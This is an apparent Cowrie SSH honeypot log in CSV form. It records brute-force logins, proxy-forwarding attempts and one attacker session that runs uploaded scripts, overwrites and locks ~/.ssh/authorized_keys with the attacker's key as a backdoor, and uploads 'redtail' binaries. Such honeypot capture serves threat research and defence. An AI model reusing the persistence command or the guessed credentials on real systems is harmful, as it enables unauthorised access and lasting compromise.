eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.direct-tcpip.data,194.169.175.37,,142.250.203.196,443,3ab7ae9a0ecc,,,,,"discarded direct-tcp forward request 0 to 142.250.203.196:443 with data b""\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03\xe2\xa7b\xff^\xc2\x15\xb7_\xd2\x18\x8b\xb8\x1e\xa8a\xce~\xd8\xb0k\xbfSe\xc8\xf65\x94$s\x9cu \xd7\x18]\xf0\xe5\x9d&fV\xfa\xa1PjM4\xc1:\x1d\xd5\xc1g\xd6\xa1-SJ\x02h\xd1nL\x19\x00V\x13\x02\x13\x03\x13\x01\xc0,\xc00\xc0+\xc0/\xcc\xa9\xcc\xa8\x00\x9f\x00\x9e\xcc\xaa\xc0\xaf\xc0\xad\xc0\xae\xc0\xac\xc0$\xc0(\xc0#\xc0'\xc0\n\xc0\x14\xc0\t\xc0\x13\xc0\xa3\xc0\x9f\xc0\xa2\xc0\x9e\x00k\x00g\x009\x003\x00\x9d\x00\x9c\xc0\xa1\xc0\x9d\xc0\xa0\xc0\x9c\x00=\x00<\x005\x00/\x00\xff\x01\x00\x01]\x00\x00\x00\x13\x00\x11\x00\x00\x0ewww.google.com\x00\x0b\x00\x04\x03\x00\x01\x02\x00\n\x00\x0c\x00\n\x00\x1d\x00\x17\x00\x1e\x00\x19\x00\x18\x00\x10\x00\x0b\x00\t\x08http/1.1\x00\x16\x00\x00\x00\x17\x00\x00\x001\x00\x00\x00\r\x00*\x00(\x04\x03\x05\x03\x06\x03\x08\x07\x08\x08\x08\t\x08\n\x08\x0b\x08\x04\x08\x05\x08\x06\x04\x01\x05\x01\x06\x01\x03\x03\x03\x01\x03\x02\x04\x02\x05\x02\x06\x02\x00+\x00\x05\x04\x03\x04\x03\x03\x00-\x00\x02\x01\x01\x003\x00&\x00$\x00\x1d\x00 \x84\xd2G\x1eE\xfd\x95\xcd\x93\x1a\x9a\xbf\x13\xe0\xac\xce\xa7\x1f\xbej\xf8\xd4\x86\xd4~\xd1m\xfa\xa1\xa1\xbf`\x00\x15\x00\xa8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""",localhost,2024-11-14T00:55:28.265167Z
cowrie.direct-tcpip.request,194.169.175.37,37136,34.117.59.81,443,3ab7ae9a0ecc,,,,,direct-tcp connection request to 34.117.59.81:443 from 127.0.0.1:37136,localhost,2024-11-14T00:55:28.488353Z
cowrie.direct-tcpip.data,194.169.175.37,,34.117.59.81,443,3ab7ae9a0ecc,,,,,"discarded direct-tcp forward request 1 to 34.117.59.81:443 with data b""\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03\x03\x7f:\xfa{\xe9\xd4i. b\xcc\xe1\xf8}\xee\x85\x99\t\xa1\xb5\xc1Iq\xcb\xfc!\x0fK\xa4G\xdd \xa2\xeaR\x11\x1e\xec\xc6\xffP&+\\Kta~\xbe?hb U\xb3S\x8f\xf7wn?\xf4f\xbb\x00V\x13\x02\x13\x03\x13\x01\xc0,\xc00\xc0+\xc0/\xcc\xa9\xcc\xa8\x00\x9f\x00\x9e\xcc\xaa\xc0\xaf\xc0\xad\xc0\xae\xc0\xac\xc0$\xc0(\xc0#\xc0'\xc0\n\xc0\x14\xc0\t\xc0\x13\xc0\xa3\xc0\x9f\xc0\xa2\xc0\x9e\x00k\x00g\x009\x003\x00\x9d\x00\x9c\xc0\xa1\xc0\x9d\xc0\xa0\xc0\x9c\x00=\x00<\x005\x00/\x00\xff\x01\x00\x01]\x00\x00\x00\x0e\x00\x0c\x00\x00\tipinfo.io\x00\x0b\x00\x04\x03\x00\x01\x02\x00\n\x00\x0c\x00\n\x00\x1d\x00\x17\x00\x1e\x00\x19\x00\x18\x00\x10\x00\x0b\x00\t\x08http/1.1\x00\x16\x00\x00\x00\x17\x00\x00\x001\x00\x00\x00\r\x00*\x00(\x04\x03\x05\x03\x06\x03\x08\x07\x08\x08\x08\t\x08\n\x08\x0b\x08\x04\x08\x05\x08\x06\x04\x01\x05\x01\x06\x01\x03\x03\x03\x01\x03\x02\x04\x02\x05\x02\x06\x02\x00+\x00\x05\x04\x03\x04\x03\x03\x00-\x00\x02\x01\x01\x003\x00&\x00$\x00\x1d\x00 \xe9n\xfe\xbd/\x02\xf6\xe3\xb8\x01\xbbs\x9e\xfd\x8f6:\xb6I3\x18]\x06\xcf\xa1\xa9\xc8\x82\xden\x02s\x00\x15\x00\xad\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""",localhost,2024-11-14T00:55:28.762056Z
cowrie.session.closed,194.169.175.37,,,,3ab7ae9a0ecc,,,,,Connection lost after 3 seconds,localhost,2024-11-14T00:55:29.025966Z
cowrie.session.connect,218.92.0.216,44074,172.233.154.19,2222,c03a4e0d771b,ssh,,,,New connection: 218.92.0.216:44074 (172.233.154.19:2222) [session: c03a4e0d771b],localhost,2024-11-14T00:59:54.896992Z
cowrie.client.version,218.92.0.216,,,,c03a4e0d771b,,SSH-2.0-PUTTY,,,Remote SSH version: SSH-2.0-PUTTY,localhost,2024-11-14T00:59:54.897938Z
cowrie.client.kex,218.92.0.216,,,,c03a4e0d771b,,,1616c6d18e845e7a01168a44591f7a35,"ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc;hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com;none",SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35,localhost,2024-11-14T00:59:55.081456Z
cowrie.session.closed,218.92.0.216,,,,c03a4e0d771b,,,,,Connection lost after 0 seconds,localhost,2024-11-14T00:59:55.896589Z
cowrie.session.connect,161.35.192.83,46060,172.233.154.19,2222,97316d4e98d7,ssh,,,,New connection: 161.35.192.83:46060 (172.233.154.19:2222) [session: 97316d4e98d7],localhost,2024-11-14T01:00:24.323296Z
cowrie.session.closed,161.35.192.83,,,,97316d4e98d7,,,,,Connection lost after 0 seconds,localhost,2024-11-14T01:00:24.473590Z
cowrie.session.connect,218.92.0.220,18138,172.233.154.19,2222,4b4f0599a4c8,ssh,,,,New connection: 218.92.0.220:18138 (172.233.154.19:2222) [session: 4b4f0599a4c8],localhost,2024-11-14T01:02:18.568464Z
cowrie.client.version,218.92.0.220,,,,4b4f0599a4c8,,SSH-2.0-PUTTY,,,Remote SSH version: SSH-2.0-PUTTY,localhost,2024-11-14T01:02:18.569087Z
cowrie.client.kex,218.92.0.220,,,,4b4f0599a4c8,,,1616c6d18e845e7a01168a44591f7a35,"ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc;hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com;none",SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35,localhost,2024-11-14T01:02:19.191605Z
cowrie.session.closed,218.92.0.220,,,,4b4f0599a4c8,,,,,Connection lost after 2 seconds,localhost,2024-11-14T01:02:20.616211Z
cowrie.session.connect,92.255.85.107,55923,172.233.154.19,2222,c62f55f4056c,ssh,,,,New connection: 92.255.85.107:55923 (172.233.154.19:2222) [session: c62f55f4056c],localhost,2024-11-14T01:04:16.254773Z
cowrie.client.version,92.255.85.107,,,,c62f55f4056c,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-14T01:04:16.306997Z
cowrie.client.kex,92.255.85.107,,,,c62f55f4056c,,,c3a948709cdbcfce6ee341735b6d74a2,"curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,3des-cbc,aes128-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: c3a948709cdbcfce6ee341735b6d74a2,localhost,2024-11-14T01:04:16.456644Z
cowrie.login.success,92.255.85.107,,,,c62f55f4056c,,,,,login attempt [root/broadguam1] succeeded,localhost,2024-11-14T01:04:17.219919Z
cowrie.direct-tcpip.request,92.255.85.107,0,178.20.45.148,80,c62f55f4056c,,,,,direct-tcp connection request to 178.20.45.148:80 from 0.0.0.0:0,localhost,2024-11-14T01:04:17.401638Z
cowrie.session.closed,92.255.85.107,,,,c62f55f4056c,,,,,Connection lost after 30 seconds,localhost,2024-11-14T01:04:46.318034Z
cowrie.session.connect,218.92.0.232,53750,172.233.154.19,2222,823e937c7ae6,ssh,,,,New connection: 218.92.0.232:53750 (172.233.154.19:2222) [session: 823e937c7ae6],localhost,2024-11-14T01:07:34.576292Z
cowrie.client.version,218.92.0.232,,,,823e937c7ae6,,SSH-2.0-PUTTY,,,Remote SSH version: SSH-2.0-PUTTY,localhost,2024-11-14T01:07:34.577309Z
cowrie.client.kex,218.92.0.232,,,,823e937c7ae6,,,1616c6d18e845e7a01168a44591f7a35,"ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc;hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com;none",SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35,localhost,2024-11-14T01:07:35.238797Z
cowrie.session.closed,218.92.0.232,,,,823e937c7ae6,,,,,Connection lost after 5 seconds,localhost,2024-11-14T01:07:39.819166Z
cowrie.session.connect,94.159.104.177,41114,172.233.154.19,2222,843ae6633437,ssh,,,,New connection: 94.159.104.177:41114 (172.233.154.19:2222) [session: 843ae6633437],localhost,2024-11-14T01:08:03.760887Z
cowrie.client.version,94.159.104.177,,,,843ae6633437,,SSH-2.0-libssh2_1.11.0,,,Remote SSH version: SSH-2.0-libssh2_1.11.0,localhost,2024-11-14T01:08:03.761467Z
cowrie.client.kex,94.159.104.177,,,,843ae6633437,,,5741d3852f927da511861c6662f84439,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,arcfour128,arcfour,3des-cbc;hmac-sha2-256,hmac-sha2-256-etm@openssh.com,hmac-sha2-512,hmac-sha2-512-etm@openssh.com,hmac-sha1,hmac-sha1-etm@openssh.com,hmac-sha1-96,hmac-md5,hmac-md5-96;none",SSH client hassh fingerprint: 5741d3852f927da511861c6662f84439,localhost,2024-11-14T01:08:03.907404Z
cowrie.login.failed,94.159.104.177,,,,843ae6633437,,,,,login attempt [melvin/melvin] failed,localhost,2024-11-14T01:08:04.526798Z
cowrie.session.closed,94.159.104.177,,,,843ae6633437,,,,,Connection lost after 1 seconds,localhost,2024-11-14T01:08:05.673182Z
cowrie.session.connect,161.35.192.83,57088,172.233.154.19,2222,2e500a725b63,ssh,,,,New connection: 161.35.192.83:57088 (172.233.154.19:2222) [session: 2e500a725b63],localhost,2024-11-14T01:08:12.586421Z
cowrie.client.version,161.35.192.83,,,,2e500a725b63,,SSH-2.0-libssh_0.9.3,,,Remote SSH version: SSH-2.0-libssh_0.9.3,localhost,2024-11-14T01:08:12.587293Z
cowrie.client.kex,161.35.192.83,,,,2e500a725b63,,,ba19a58a192de4fe89e3f7e2f9917fc9,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: ba19a58a192de4fe89e3f7e2f9917fc9,localhost,2024-11-14T01:08:12.739331Z
cowrie.login.failed,161.35.192.83,,,,2e500a725b63,,,,,login attempt [root/root] failed,localhost,2024-11-14T01:08:13.385487Z
cowrie.session.closed,161.35.192.83,,,,2e500a725b63,,,,,Connection lost after 1 seconds,localhost,2024-11-14T01:08:14.538819Z
cowrie.session.connect,94.159.104.177,33930,172.233.154.19,2222,3e256c4ea39b,ssh,,,,New connection: 94.159.104.177:33930 (172.233.154.19:2222) [session: 3e256c4ea39b],localhost,2024-11-14T01:08:17.822227Z
cowrie.client.version,94.159.104.177,,,,3e256c4ea39b,,SSH-2.0-libssh2_1.11.0,,,Remote SSH version: SSH-2.0-libssh2_1.11.0,localhost,2024-11-14T01:08:17.822832Z
cowrie.client.kex,94.159.104.177,,,,3e256c4ea39b,,,5741d3852f927da511861c6662f84439,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,arcfour128,arcfour,3des-cbc;hmac-sha2-256,hmac-sha2-256-etm@openssh.com,hmac-sha2-512,hmac-sha2-512-etm@openssh.com,hmac-sha1,hmac-sha1-etm@openssh.com,hmac-sha1-96,hmac-md5,hmac-md5-96;none",SSH client hassh fingerprint: 5741d3852f927da511861c6662f84439,localhost,2024-11-14T01:08:17.970968Z
cowrie.login.success,94.159.104.177,,,,3e256c4ea39b,,,,,login attempt [root/owner] succeeded,localhost,2024-11-14T01:08:18.597414Z
cowrie.session.closed,94.159.104.177,,,,3e256c4ea39b,,,,,Connection lost after 0 seconds,localhost,2024-11-14T01:08:18.749443Z
cowrie.session.connect,87.120.113.231,45600,172.233.154.19,2222,62cdb270106a,ssh,,,,New connection: 87.120.113.231:45600 (172.233.154.19:2222) [session: 62cdb270106a],localhost,2024-11-14T01:08:18.924140Z
cowrie.client.version,87.120.113.231,,,,62cdb270106a,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-14T01:08:18.924938Z
cowrie.client.kex,87.120.113.231,,,,62cdb270106a,,,0a07365cc01fa9fc82608ba4019af499,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499,localhost,2024-11-14T01:08:19.062281Z
cowrie.login.success,87.120.113.231,,,,62cdb270106a,,,,,login attempt [root/owner] succeeded,localhost,2024-11-14T01:08:19.478350Z
cowrie.session.params,87.120.113.231,,,,62cdb270106a,,,,,[],localhost,2024-11-14T01:08:46.431399Z
cowrie.command.input,87.120.113.231,,,,62cdb270106a,,,,,"CMD: chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629"" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e ""\x61\x75\x74\x68\x5F\x6F\x6B\x0A""",localhost,2024-11-14T01:08:46.432010Z
cowrie.session.file_download,87.120.113.231,,,,62cdb270106a,,,,,Saved redir contents with SHA-256 8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b to var/lib/cowrie/downloads/8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b,localhost,2024-11-14T01:08:46.578642Z
cowrie.log.closed,87.120.113.231,,,,62cdb270106a,,,,,Closing TTY Log: var/lib/cowrie/tty/4a869e4a816476f12d5cd6aab0625c5f6aab97714a486f6b8a5f484cbc8981f6 after 0 seconds,localhost,2024-11-14T01:08:46.579361Z
cowrie.session.file_upload,87.120.113.231,,,,62cdb270106a,,,,,"SFTP Uploaded file ""clean.sh"" to var/lib/cowrie/downloads/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e",localhost,2024-11-14T01:08:46.580044Z
cowrie.session.file_upload,87.120.113.231,,,,62cdb270106a,,,,,"SFTP Uploaded file ""redtail.arm7"" to var/lib/cowrie/downloads/d4635f0f5ab84af5e5194453dbf60eaebf6ec47d3675cb5044e5746fb48bd4b4",localhost,2024-11-14T01:08:46.586823Z
cowrie.session.file_upload,87.120.113.231,,,,62cdb270106a,,,,,"SFTP Uploaded file ""redtail.arm8"" to var/lib/cowrie/downloads/992cb5a753697ee2642aa390f09326fcdb7fd59119053d6b1bdd35d47e62f472",localhost,2024-11-14T01:08:46.590469Z
cowrie.session.file_upload,87.120.113.231,,,,62cdb270106a,,,,,"SFTP Uploaded file ""redtail.i686"" to var/lib/cowrie/downloads/69dc9dd8065692ea262850b617c621e6c1361e9095a90b653b26e3901597f586",localhost,2024-11-14T01:08:46.593705Z
cowrie.session.file_upload,87.120.113.231,,,,62cdb270106a,,,,,"SFTP Uploaded file ""redtail.x86_64"" to var/lib/cowrie/downloads/29f8524562c2436f42019e0fc473bd88584234c57979c7375c1ace3648784e4b",localhost,2024-11-14T01:08:46.597197Z
cowrie.session.file_upload,87.120.113.231,,,,62cdb270106a,,,,,"SFTP Uploaded file ""setup.sh"" to var/lib/cowrie/downloads/3b15778595cef00d1a51035dd4fd65e6be97e73544cb1899f40aec4aaa0445ae",localhost,2024-11-14T01:08:46.598092Z
cowrie.session.closed,87.120.113.231,,,,62cdb270106a,,,,,Connection lost after 27 seconds,localhost,2024-11-14T01:08:46.598560Z
cowrie.session.connect,45.79.128.205,6534,172.233.154.19,2222,78c7e038a71d,ssh,,,,New connection: 45.79.128.205:6534 (172.233.154.19:2222) [session: 78c7e038a71d],localhost,2024-11-14T01:11:12.112214Z
cowrie.client.version,45.79.128.205,,,,78c7e038a71d,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-14T01:11:12.112942Z
cowrie.client.kex,45.79.128.205,,,,78c7e038a71d,,,4e066189c3bbeec38c99b1855113733a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a,localhost,2024-11-14T01:11:12.174731Z
cowrie.session.closed,45.79.128.205,,,,78c7e038a71d,,,,,Connection lost after 0 seconds,localhost,2024-11-14T01:11:12.239407Z
cowrie.session.connect,45.79.128.205,6536,172.233.154.19,2222,b28d73dc5f42,ssh,,,,New connection: 45.79.128.205:6536 (172.233.154.19:2222) [session: b28d73dc5f42],localhost,2024-11-14T01:11:12.300307Z
cowrie.client.version,45.79.128.205,,,,b28d73dc5f42,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-14T01:11:12.301061Z
cowrie.client.kex,45.79.128.205,,,,b28d73dc5f42,,,4e066189c3bbeec38c99b1855113733a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a,localhost,2024-11-14T01:11:12.365542Z
cowrie.session.closed,45.79.128.205,,,,b28d73dc5f42,,,,,Connection lost after 0 seconds,localhost,2024-11-14T01:11:12.430712Z
cowrie.session.connect,45.79.128.205,6552,172.233.154.19,2222,baaf55fe4067,ssh,,,,New connection: 45.79.128.205:6552 (172.233.154.19:2222) [session: baaf55fe4067],localhost,2024-11-14T01:11:12.490525Z
cowrie.client.version,45.79.128.205,,,,baaf55fe4067,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-14T01:11:12.491303Z
cowrie.client.kex,45.79.128.205,,,,baaf55fe4067,,,4e066189c3bbeec38c99b1855113733a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a,localhost,2024-11-14T01:11:12.551973Z
cowrie.session.closed,45.79.128.205,,,,baaf55fe4067,,,,,Connection lost after 0 seconds,localhost,2024-11-14T01:11:12.615100Z
cowrie.session.connect,161.35.192.83,50014,172.233.154.19,2222,9513e3fc049a,ssh,,,,New connection: 161.35.192.83:50014 (172.233.154.19:2222) [session: 9513e3fc049a],localhost,2024-11-14T01:12:25.813173Z
cowrie.client.version,161.35.192.83,,,,9513e3fc049a,,SSH-2.0-libssh_0.9.3,,,Remote SSH version: SSH-2.0-libssh_0.9.3,localhost,2024-11-14T01:12:25.814069Z
cowrie.client.kex,161.35.192.83,,,,9513e3fc049a,,,ba19a58a192de4fe89e3f7e2f9917fc9,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: ba19a58a192de4fe89e3f7e2f9917fc9,localhost,2024-11-14T01:12:25.964431Z
cowrie.login.success,161.35.192.83,,,,9513e3fc049a,,,,,login attempt [root/123] succeeded,localhost,2024-11-14T01:12:26.605831Z
cowrie.session.params,161.35.192.83,,,,9513e3fc049a,,,,,[],localhost,2024-11-14T01:12:26.923529Z
cowrie.command.input,161.35.192.83,,,,9513e3fc049a,,,,,CMD: uname -a,localhost,2024-11-14T01:12:26.923899Z
